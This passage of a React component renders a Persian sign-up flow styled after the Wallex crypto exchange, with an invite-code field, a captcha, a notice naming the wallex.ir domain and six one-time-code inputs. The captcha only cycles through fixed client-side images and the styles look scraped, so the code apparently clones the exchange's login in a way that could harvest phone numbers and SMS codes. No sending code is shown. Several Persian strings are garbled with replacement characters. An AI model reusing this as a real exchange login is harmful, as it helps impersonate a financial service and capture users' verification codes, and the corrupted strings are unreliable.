                    gap: "4px",
                    gridGap: "4px",
                    gridRowGap: "4px",
                    rowGap: "4px",
                  }}
                >
                  <button
                    tabIndex={0}
                    type="button"
                    onClick={() => setShowInviteCode(!showInviteCode)}
                    style={{
                      alignItems: "center",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(0, 122, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(0, 122, 255)",
                      cursor: "pointer",
                      display: "flex",
                      fontSize: "14px",
                      fontWeight: "700",
                      justifyContent: "center",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      paddingLeft: "0px",
                      paddingRight: "0px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty: "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      backgroundColor: "rgba(0, 0, 0, 0)",
                      border: "none",
                    }}
                  >
                    <span>کد دعوت (اختیاری)</span>
                    <span
                      style={{
                        borderColor: "rgb(0, 122, 255)",
                        color: "rgb(0, 122, 255)",
                        cursor: "pointer",
                        display: "flex",
                        fontSize: "14px",
                        fontWeight: "700",
                        lineHeight: "24.01px",
                        marginLeft: "-4px",
                        marginRight: "2px",
                        outlineColor: "rgb(0, 122, 255)",
                        textAlign: "center",
                        textDecorationColor: "rgb(0, 122, 255)",
                        textEmphasisColor: "rgb(0, 122, 255)",
                        textTransform: "uppercase",
                        userSelect: "none",
                      }}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="none"
                        focusable="false"
                        aria-hidden="true"
                        viewBox="0 0 24 24"
                        style={{
                          borderColor: "rgb(0, 122, 255)",
                          color: "rgb(0, 122, 255)",
                          cursor: "pointer",
                          fill: "rgb(0, 122, 255)",
                          flexShrink: "0",
                          fontSize: "24px",
                          fontWeight: "700",
                          height: "24px",
                          lineHeight: "41.16px",
                          outlineColor: "rgb(0, 122, 255)",
                          overflowClipMargin: "content-box",
                          overflowX: "hidden",
                          overflowY: "hidden",
                          textAlign: "center",
                          textDecorationColor: "rgb(0, 122, 255)",
                          textEmphasisColor: "rgb(0, 122, 255)",
                          textTransform: "uppercase",
                          transitionDuration: "0.2s",
                          transitionProperty: "fill",
                          transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                          userSelect: "none",
                          width: "24px",
                          transform: showInviteCode ? "rotate(180deg)" : "rotate(0deg)",
                          transition: "transform 0.2s",
                        }}
                      >
                        <path
                          fill="currentColor"
                          fillRule="evenodd"
                          d="M7.293 9.293a1 1 0 0 1 1.414 0L12 12.586l3.293-3.293a1 1 0 1 1 1.414 1.414l-4 4a1 1 0 0 1-1.414 0l-4-4a1 1 0 0 1 0-1.414"
                          clipRule="evenodd"
                        />
                      </svg>
                    </span>
                  </button>
                  <div
                    style={{
                      height: showInviteCode ? "auto" : "0px",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      transitionDuration: "0.3s",
                      transitionProperty: "height",
                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                      visibility: showInviteCode ? "visible" : "hidden",
                      width: "100%",
                    }}
                >
                  {showInviteCode && (
                    <div
                      style={{
                        display: "flex",
                        visibility: "visible",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          width: "100%",
                        }}
                      >
                        <div
                          style={{
                            display: "inline-flex",
                            flexDirection: "column",
                            position: "relative",
                            verticalAlign: "top",
                            width: "100%",
                            marginBottom: "4px",
                          }}
                        >
                          <div
                            style={{
                              alignItems: "center",
                              borderBottomLeftRadius: "8px",
                              borderBottomRightRadius: "8px",
                              borderRadius: "8px",
                              borderTopLeftRadius: "8px",
                              borderTopRightRadius: "8px",
                              cursor: "text",
                              display: "flex",
                              position: "relative",
                              width: "100%",
                            }}
                          >
                            <input
                              aria-invalid="false"
                              name="invite_code"
                              placeholder="کد معرف (اختیاری)"
                              type="text"
                              value={inviteCode}
                              onChange={(e) => setInviteCode(e.target.value)}
                              style={{
                                animation:
                                  "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                                animationDuration: "0.01s",
                                animationName: "mui-auto-fill-cancel",
                                appearance: "auto",
                                boxSizing: "content-box",
                                cursor: "text",
                                fontFeatureSettings: '"ss00"',
                                overflowX: "clip",
                                overflowY: "clip",
                                paddingBottom: "10px",
                                paddingLeft: "12px",
                                paddingRight: "12px",
                                paddingTop: "10px",
                                width: "100%",
                                fontSize: "14px",
                                textAlign: "right",
                                backgroundColor: "rgb(255, 255, 255)",
                                border: "none",
                                outline: "none",
                              }}
                            />
                            <fieldset
                              aria-hidden="true"
                              style={{
                                borderBottomLeftRadius: "8px",
                                borderBottomRightRadius: "8px",
                                borderBottomStyle: "solid",
                                borderBottomWidth: "1px",
                                borderBottomColor: "rgba(0, 0, 0, 0.2)",
                                borderLeftStyle: "solid",
                                borderLeftWidth: "1px",
                                borderLeftColor: "rgba(0, 0, 0, 0.2)",
                                borderRadius: "8px",
                                borderRightStyle: "solid",
                                borderRightWidth: "1px",
                                borderRightColor: "rgba(0, 0, 0, 0.2)",
                                borderTopLeftRadius: "8px",
                                borderTopRightRadius: "8px",
                                borderTopStyle: "solid",
                                borderTopWidth: "1px",
                                borderTopColor: "rgba(0, 0, 0, 0.2)",
                                bottom: "0px",
                                cursor: "text",
                                left: "0px",
                                minWidth: "0%",
                                overflowX: "hidden",
                                overflowY: "hidden",
                                paddingLeft: "8px",
                                paddingRight: "8px",
                                pointerEvents: "none",
                                position: "absolute",
                                right: "0px",
                                textAlign: "right",
                                top: "-5px",
                              }}
                            >
                              <legend
                                style={{
                                  cursor: "text",
                                  lineHeight: "11px",
                                  overflowX: "hidden",
                                  overflowY: "hidden",
                                  pointerEvents: "none",
                                  textAlign: "right",
                                  transitionDuration: "0.15s",
                                  transitionProperty: "width",
                                  transitionTimingFunction:
                                    "cubic-bezier(0, 0, 0.2, 1)",
                                }}
                              >
                                <span
                                  aria-hidden="true"
                                  style={{
                                    cursor: "text",
                                    display: "inline",
                                    lineHeight: "11px",
                                    pointerEvents: "none",
                                    textAlign: "right",
                                  }}
                                >
                                  ​
                                </span>
                              </legend>
                            </fieldset>
                          </div>
                        </div>
                        <p
                          style={{
                            borderColor: "rgba(0, 0, 0, 0.6)",
                            color: "rgba(0, 0, 0, 0.6)",
                            fontSize: "12px",
                            lineHeight: "20.004px",
                            marginTop: "8px",
                            outlineColor: "rgba(0, 0, 0, 0.6)",
                            textAlign: "right",
                            textDecorationColor: "rgba(0, 0, 0, 0.6)",
                            textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                            display: "flex",
                            alignItems: "center",
                          }}
                        >
                          <Info
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              display: "inline-block",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              height: "24px",
                              lineHeight: "26.672px",
                              marginLeft: "8px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "right",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              verticalAlign: "middle",
                              width: "24px",
                            }}
                          />
                          <span>
                            ��د دعوت صرفا د�� زمان ثبت‌نام قابل استفاده است.
                          </span>
                        </p>
                      </div>
                    </div>
                  )}
                  </div>
                </div>

                {/* Captcha Section */}
                <div
                  style={{
                    alignItems: "center",
                    display: "flex",
                    flexDirection: "column",
                    height: "80px",
                    justifyContent: "center",
                  }}
                >
                  <div
                    style={{
                      alignItems: "center",
                      display: "flex",
                      gap: "8px",
                      gridGap: "8px",
                      gridRowGap: "8px",
                      marginBottom: "4px",
                      marginTop: "4px",
                      rowGap: "8px",
                    }}
                  >
                    <div
                      inputMode="numeric"
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        maxWidth: "160px",
                        position: "relative",
                        verticalAlign: "top",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          alignItems: "center",
                          backgroundColor: "rgb(245, 246, 247)",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          cursor: "text",
                          display: "flex",
                          position: "relative",
                          width: "100%",
                        }}
                      >
                        <input
                          aria-invalid="false"
                          placeholder="کد امنیتی"
                          type="text"
                          maxLength={5}
                          inputMode="numeric"
                          value={captchaCode}
                          onChange={(e) => setCaptchaCode(e.target.value)}
                          style={{
                            animation: "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                            animationDuration: "0.01s",
                            animationName: "mui-auto-fill-cancel",
                            appearance: "auto",
                            boxSizing: "content-box",
                            cursor: "text",
                            overflowX: "clip",
                            overflowY: "clip",
                            paddingBottom: "10px",
                            paddingLeft: "12px",
                            paddingRight: "12px",
                            paddingTop: "10px",
                            width: "100%",
                            border: "none",
                            outline: "none",
                            backgroundColor: "transparent",
                          }}
                        />
                        <div
                          style={{
                            alignItems: "center",
                            borderColor: "rgba(0, 0, 0, 0.6)",
                            color: "rgba(0, 0, 0, 0.6)",
                            cursor: "text",
                            display: "flex",
                            maxHeight: "32px",
                            outlineColor: "rgba(0, 0, 0, 0.6)",
                            textDecorationColor: "rgba(0, 0, 0, 0.6)",
                            textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                            textWrap: "nowrap",
                            whiteSpace: "nowrap",
                          }}
                        >
                          <button
                            tabIndex={0}
                            type="button"
                            onClick={() => {
                              // Cycle to next captcha image
                              setCurrentCaptchaIndex((prev) => (prev + 1) % captchaImages.length);
                              // Clear current captcha input
                              setCaptchaCode("");
                              console.log("Refreshing captcha...");
                            }}
                            style={{
                              alignItems: "center",
                              borderBottomLeftRadius: "50%",
                              borderBottomRightRadius: "50%",
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              borderRadius: "50%",
                              borderTopLeftRadius: "50%",
                              borderTopRightRadius: "50%",
                              color: "rgba(0, 0, 0, 0.6)",
                              cursor: "pointer",
                              display: "flex",
                              flexShrink: "0",
                              fontSize: "24px",
                              justifyContent: "center",
                              lineHeight: "42px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              paddingBottom: "8px",
                              paddingLeft: "8px",
                              paddingRight: "8px",
                              paddingTop: "8px",
                              position: "relative",
                              textAlign: "center",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              textWrap: "nowrap",
                              transitionDuration: "0.15s",
                              transitionProperty: "background-color",
                              transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              verticalAlign: "middle",
                              whiteSpace: "nowrap",
                              backgroundColor: "rgba(0, 0, 0, 0)",
                              border: "none",
                            }}
                          >
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="24"
                              height="24"
                              fill="none"
                              focusable="false"
                              aria-hidden="true"
                              viewBox="0 0 24 24"
                              style={{
                                borderColor: "rgba(0, 0, 0, 0.6)",
                                color: "rgba(0, 0, 0, 0.6)",
                                cursor: "pointer",
                                fill: "rgba(0, 0, 0, 0.6)",
                                flexShrink: "0",
                                fontSize: "24px",
                                height: "24px",
                                lineHeight: "42px",
                                outlineColor: "rgba(0, 0, 0, 0.6)",
                                overflowClipMargin: "content-box",
                                overflowX: "hidden",
                                overflowY: "hidden",
                                textAlign: "center",
                                textDecorationColor: "rgba(0, 0, 0, 0.6)",
                                textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                                textWrap: "nowrap",
                                transitionDuration: "0.2s",
                                transitionProperty: "fill",
                                transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                                userSelect: "none",
                                whiteSpace: "nowrap",
                                width: "24px",
                              }}
                            >
                              <path
                                fill="currentColor"
                                d="m21.67 9.208.009-.074.32-4.662a.8.8 0 0 0-.736-.849.797.797 0 0 0-.838.743l-.155 2.257a11.4 11.4 0 0 0-1.389-1.702c-3.86-3.904-10.138-3.889-13.99.008-3.851 3.897-3.859 10.24 0 14.145s10.13 3.896 13.99.007c1.395-1.411 1.967-2.226 2.583-4.29a.79.79 0 0 0-.616-.938.784.784 0 0 0-.928.623c-.468 1.379-.98 2.278-2.152 3.464a8.25 8.25 0 0 1-11.756 0c-3.243-3.28-3.243-8.611 0-11.892a8.25 8.25 0 0 1 11.756 0 9.7 9.7 0 0 1 1.5 1.97l-2.584-.408a.8.8 0 0 0-.675 1.359c.119.12.26.202.43.225l4.229.659a.6.6 0 0 0 .172.024.77.77 0 0 0 .455-.112.78.78 0 0 0 .375-.557"
                              />
                            </svg>
                          </button>
                        </div>
                        <fieldset
                          aria-hidden="true"
                          style={{
                            borderBottom: "1px solid rgba(0, 0, 0, 0)",
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderBottomStyle: "solid",
                            borderBottomWidth: "1px",
                            borderColor: "rgba(0, 0, 0, 0)",
                            borderLeft: "1px solid rgba(0, 0, 0, 0)",
                            borderLeftStyle: "solid",
                            borderLeftWidth: "1px",
                            borderRadius: "8px",
                            borderRight: "1px solid rgba(0, 0, 0, 0)",
                            borderRightStyle: "solid",
                            borderRightWidth: "1px",
                            borderStyle: "solid",
                            borderTop: "1px solid rgba(0, 0, 0, 0)",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            borderTopStyle: "solid",
                            borderTopWidth: "1px",
                            borderWidth: "1px",
                            bottom: "0px",
                            cursor: "text",
                            left: "0px",
                            minWidth: "0%",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            paddingLeft: "8px",
                            paddingRight: "8px",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "right",
                            top: "-5px",
                          }}
                        >
                          <legend
                            style={{
                              cursor: "text",
                              lineHeight: "11px",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              pointerEvents: "none",
                              textAlign: "right",
                              transitionDuration: "0.15s",
                              transitionProperty: "width",
                              transitionTimingFunction: "cubic-bezier(0, 0, 0.2, 1)",
                            }}
                          >
                            <span
                              aria-hidden="true"
                              style={{
                                cursor: "text",
                                display: "inline",
                                lineHeight: "11px",
                                pointerEvents: "none",
                                textAlign: "right",
                              }}
                            >
                              ​
                            </span>
                          </legend>
                        </fieldset>
                      </div>
                    </div>
                    <div style={{ height: "48px" }}>
                      <img
                        alt="کد امنیتی"
                        width="160"
                        height="48"
                        decoding="async"
                        src={captchaImages[currentCaptchaIndex]}
                        style={{
                          aspectRatio: "auto 160 / 48",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderColor: "rgba(0, 0, 0, 0.2)",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          border: "1px solid rgba(0, 0, 0, 0.2)",
                          color: "rgba(0, 0, 0, 0)",
                          display: "inline",
                          height: "48px",
                          outlineColor: "rgba(0, 0, 0, 0)",
                          overflowClipMargin: "content-box",
                          overflowX: "clip",
                          overflowY: "clip",
                          textDecorationColor: "rgba(0, 0, 0, 0)",
                          textEmphasisColor: "rgba(0, 0, 0, 0)",
                          width: "160px",
                        }}
                      />
                    </div>
                  </div>
                </div>

                {/* Submit Section */}
                <div
                  style={{
                    marginTop: "32px",
                  }}
                >
                  <hr
                    style={{
                      borderBottom: "1px solid rgba(0, 0, 0, 0.1)",
                      borderBottomStyle: "solid",
                      borderBottomWidth: "1px",
                      borderColor: "rgba(0, 0, 0, 0.1)",
                      borderLeftStyle: "solid",
                      borderLeftWidth: "0",
                      borderRightStyle: "solid",
                      borderRightWidth: "0",
                      borderStyle: "solid",
                      borderTopStyle: "solid",
                      borderTopWidth: "0",
                      flexShrink: "0",
                      marginBottom: "16px",
                      marginLeft: "-16px",
                      marginRight: "-16px",
                      overflowX: "hidden",
                      overflowY: "hidden",
                    }}
                  />
                  <button
                    tabIndex={0}
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(0, 122, 255)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال ارسال ک��...</span>
                      </div>
                    ) : (
                      <span>ثبت و ادامه</span>
                    )}
                  </button>
                </div>


              </form>

              {/* Security Notice */}
              <div
                style={{
                  alignItems: "center",
                  backgroundColor: "rgb(251, 251, 252)",
                  borderBottomLeftRadius: "16px",
                  borderBottomRightRadius: "16px",
                  borderColor: "rgba(0, 0, 0, 0.6)",
                  color: "rgba(0, 0, 0, 0.6)",
                  display: "flex",
                  gap: "4px",
                  gridGap: "4px",
                  gridRowGap: "4px",
                  justifyContent: "center",
                  outlineColor: "rgba(0, 0, 0, 0.6)",
                  paddingBottom: "12px",
                  paddingLeft: "16px",
                  paddingRight: "16px",
                  paddingTop: "12px",
                  rowGap: "4px",
                  textDecorationColor: "rgba(0, 0, 0, 0.6)",
                  textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                  width: "100%",
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  fill="none"
                  focusable="false"
                  aria-hidden="true"
                  viewBox="0 0 24 24"
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.6)",
                    color: "rgba(0, 0, 0, 0.6)",
                    fill: "rgba(0, 0, 0, 0.6)",
                    flexShrink: "0",
                    fontSize: "24px",
                    height: "24px",
                    lineHeight: "42px",
                    outlineColor: "rgba(0, 0, 0, 0.6)",
                    overflowClipMargin: "content-box",
                    overflowX: "hidden",
                    overflowY: "hidden",
                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    transitionDuration: "0.2s",
                    transitionProperty: "fill",
                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    width: "24px",
                  }}
                >
                  <path
                    fill="currentColor"
                    d="M12 17.075a.75.75 0 0 1-.75-.75v-2.167a.75.75 0 1 1 1.5 0v2.167a.75.75 0 0 1-.75.75"
                  />
                  <path
                    fill="currentColor"
                    fillRule="evenodd"
                    d="M17.2 8.875V7.37A5.2 5.2 0 0 0 6.8 7.36v1.514q-.421.093-.833.234c-.768.37-1.388.989-1.758 1.757a7.75 7.75 0 0 0-.37 3.333v2.132a7.8 7.8 0 0 0 .37 3.334 3.77 3.77 0 0 0 1.757 1.756 7.7 7.7 0 0 0 3.334.37h5.4a7.7 7.7 0 0 0 3.332-.373 3.76 3.76 0 0 0 1.758-1.756 7.7 7.7 0 0 0 .37-3.334v-2.13a7.7 7.7 0 0 0-.37-3.331 3.76 3.76 0 0 0-1.757-1.758 8 8 0 0 0-.832-.233m-8.9-.18q.5-.011 1 .043h5.4a8 8 0 0 1 .998-.044v-1.31a3.67 3.67 0 0 0-1.116-2.593 3.57 3.57 0 0 0-2.628-1.05A3.68 3.68 0 0 0 8.3 7.376zM6.618 10.46a7.4 7.4 0 0 1 2.683-.222l5.4-.003c.9-.091 1.81-.016 2.684.222.46.222.832.594 1.054 1.055.238.873.313 1.782.222 2.683v2.132c.091.9.016 1.81-.222 2.684-.222.46-.594.832-1.055 1.054a7.4 7.4 0 0 1-2.683.222H9.3c-.9.09-1.81.016-2.684-.222a2.27 2.27 0 0 1-1.055-1.053 7.4 7.4 0 0 1-.221-2.685v-2.13a7.4 7.4 0 0 1 .22-2.682 2.26 2.26 0 0 1 1.057-1.055"
                    clipRule="evenodd"
                  />
                </svg>
                <p
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.6)",
                    color: "rgba(0, 0, 0, 0.6)",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    outlineColor: "rgba(0, 0, 0, 0.6)",
                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                  }}
                >
                  <span>مطمئن شوید که در دامنه</span>
                  <span
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.6)",
                      color: "rgba(0, 0, 0, 0.6)",
                      display: "inline",
                      fontSize: "14px",
                      fontWeight: "700",
                      lineHeight: "24.01px",
                      outlineColor: "rgba(0, 0, 0, 0.6)",
                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    }}
                  >
                    https://wallex.ir
                  </span>
                  <span>هستید.</span>
                </p>
              </div>
            </>
          )}

          {/* Step 2: Phone Verification */}
          {currentStep === "verify-phone" && (
            <>
              <h5
                style={{
                  fontSize: "20px",
                  fontWeight: "700",
                  lineHeight: "28px",
                  marginBottom: "12px",
                  textAlign: "center",
                }}
              >
                ��د تایید را وارد کنید
              </h5>

              <h6
                style={{
                  fontSize: "14px",
                  fontWeight: "500",
                  lineHeight: "24.01px",
                  marginBottom: "4px",
                }}
              >
                <span>کد تأیید به شماره موبایل </span>
                <b
                  dir="ltr"
                  style={{
                    direction: "ltr",
                    display: "inline",
                    fontSize: "14px",
                    fontWeight: "700",
                    lineHeight: "24.01px",
                  }}
                >
                  {phoneNumber || "09105556565"}
                </b>
                <span> ارسال شد.</span>
              </h6>

              <div
                style={{
                  paddingBottom: "12px",
                  paddingTop: "8px",
                }}
              >
                <button
                  tabIndex={0}
                  type="button"
                  onClick={() => setCurrentStep("phone")}
                  style={{
                    alignItems: "center",
                    borderBottomLeftRadius: "8px",
                    borderBottomRightRadius: "8px",
                    borderRadius: "8px",
                    borderTopLeftRadius: "8px",
                    borderTopRightRadius: "8px",
                    color: "rgb(0, 122, 255)",
                    cursor: "pointer",
                    display: "inline-flex",
                    fontSize: "14px",
                    fontWeight: "700",
                    justifyContent: "center",
                    lineHeight: "24.01px",
                    paddingBottom: "6px",
                    paddingLeft: "8px",
                    paddingRight: "8px",
                    paddingTop: "6px",
                    position: "relative",
                    textAlign: "center",
                    textTransform: "uppercase",
                    transitionBehavior: "normal, normal, normal",
                    transitionDelay: "0s, 0s, 0s",
                    transitionDuration: "0.25s, 0.25s, 0.25s",
                    transitionProperty: "background-color, box-shadow, border-color",
                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    verticalAlign: "middle",
                    backgroundColor: "rgba(0, 0, 0, 0)",
                    border: "none",
                  }}
                >
                  ویرایش شماره موبایل
                </button>
              </div>

              {/* 6 Separate OTP Inputs */}
              <div
                style={{
                  direction: "ltr",
                  display: "flex",
                  flexFlow: "row wrap",
                  flexWrap: "wrap",
                  marginRight: "-8px",
                  marginTop: "4px",
                  width: "calc(100% + 8px)",
                }}
              >
                {[0, 1, 2, 3, 4, 5].map((index) => (
                  <div
                    key={index}
                    style={{
                      direction: "ltr",
                      flexBasis: "0px",
                      flexGrow: "1",
                      maxWidth: "100%",
                      paddingRight: "8px",
                      paddingTop: "8px",
                    }}
                  >
                    <div
                      style={{
                        direction: "ltr",
                        display: "inline-flex",
                        flexDirection: "column",
                        flexFlow: "column nowrap",
                        position: "relative",
                        verticalAlign: "top",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          alignItems: "center",
                          backgroundColor: "rgb(245, 246, 247)",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          cursor: "text",
                          direction: "ltr",
                          display: "flex",
                          marginBottom: "16px",
                          position: "relative",
                          textAlign: "center",
                          width: "100%",
                        }}
                      >
                        <input
                          aria-invalid="false"
                          autoComplete={index === 0 ? "one-time-code" : "off"}
                          type="tel"
                          maxLength={1}
                          value={verifyCode[index] || ""}
                          onChange={(e) => {
                            const newValue = e.target.value;
                            if (newValue.match(/^[0-9]*$/)) {
                              const newCode = verifyCode.split("");
                              newCode[index] = newValue;
                              setVerifyCode(newCode.join(""));

                              // Auto focus next input
                              if (newValue && index < 5) {
                                const nextInput = document.querySelector(
                                  `input[data-index="${index + 1}"]`,
                                ) as HTMLInputElement;
                                if (nextInput) nextInput.focus();
                              }
                            }
                          }}
                          onKeyDown={(e) => {
                            if (
                              e.key === "Backspace" &&
                              !verifyCode[index] &&
                              index > 0
                            ) {
                              const prevInput = document.querySelector(
                                `input[data-index="${index - 1}"]`,
                              ) as HTMLInputElement;
                              if (prevInput) prevInput.focus();
                            }
                          }}
                          data-index={index}
                          disabled={isSubmitting}
                          style={{
                            animation:
                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                            animationDuration: "0.01s",
                            animationName: "mui-auto-fill-cancel",
                            appearance: "auto",
                            boxSizing: "content-box",
                            cursor: "text",
                            direction: "ltr",
                            overflowX: "clip",
                            overflowY: "clip",
                            paddingBottom: "10px",
                            paddingLeft: "12px",
                            paddingRight: "12px",
                            paddingTop: "10px",
                            textAlign: "center",
                            width: "100%",
                            border: "none",
                            outline: "none",
                            fontSize: "16px",
                            fontWeight: "500",
                            backgroundColor: "rgb(245, 246, 247)",
                          }}
                        />
                        <fieldset
                          aria-hidden="true"
                          style={{
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderBottomStyle: "solid",
                            borderBottomWidth: "1px",
                            borderBottom: "1px solid rgba(0, 0, 0, 0)",
                            borderBottomColor: "rgba(0, 0, 0, 0)",
                            borderLeft: "1px solid rgba(0, 0, 0, 0)",
                            borderLeftStyle: "solid",
                            borderLeftWidth: "1px",
                            borderLeftColor: "rgba(0, 0, 0, 0)",
                            borderRadius: "8px",
                            borderRight: "1px solid rgba(0, 0, 0, 0)",
                            borderRightStyle: "solid",
                            borderRightWidth: "1px",
                            borderRightColor: "rgba(0, 0, 0, 0)",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            borderTop: "1px solid rgba(0, 0, 0, 0)",
                            borderTopStyle: "solid",
                            borderTopWidth: "1px",
                            borderTopColor: "rgba(0, 0, 0, 0)",
                            bottom: "0px",
                            cursor: "text",
                            direction: "ltr",
                            left: "0px",
                            minWidth: "0%",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            paddingLeft: "8px",
                            paddingRight: "8px",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "right",
                            top: "-5px",
                          }}
                        >
                          <legend
                            style={{
                              cursor: "text",
                              direction: "ltr",
                              lineHeight: "11px",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              pointerEvents: "none",
                              textAlign: "right",
                              transitionDuration: "0.15s",
                              transitionProperty: "width",
                              transitionTimingFunction:
                                "cubic-bezier(0, 0, 0.2, 1)",
                            }}
                          >
                            <span
                              aria-hidden="true"
                              style={{
                                cursor: "text",
                                direction: "ltr",
                                display: "inline",
                                lineHeight: "11px",
                                pointerEvents: "none",
                                textAlign: "right",
                              }}
                            >
                              ​
                            </span>
                          </legend>
                        </fieldset>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {errors.verifyCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "4px",
                  }}
                >
                  {errors.verifyCode}
                </p>
              )}

              {/* Countdown Timer */}
              <div style={{ marginTop: "4px" }}>
                {countdown > 0 ? (
                  <span
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.6)",
                      color: "rgba(0, 0, 0, 0.6)",
                      display: "inline",
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      outlineColor: "rgba(0, 0, 0, 0.6)",
                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
